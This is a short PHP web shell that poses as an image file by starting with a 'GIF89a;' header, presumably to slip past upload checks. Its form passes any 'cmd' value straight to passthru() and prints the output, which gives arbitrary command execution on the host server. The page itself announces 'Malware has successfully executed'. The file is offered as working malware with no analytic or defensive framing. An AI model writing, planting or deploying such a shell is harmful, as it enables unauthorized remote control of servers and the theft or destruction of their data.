GIF89a;
<form action="" method="post">
<form action="" method="get">
<h2>Malware has successfully executed</h2>
<br>
Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
</form>
Output:<br />
<pre>
<?php passthru($_REQUEST['cmd'], $result); ?>
</pre>
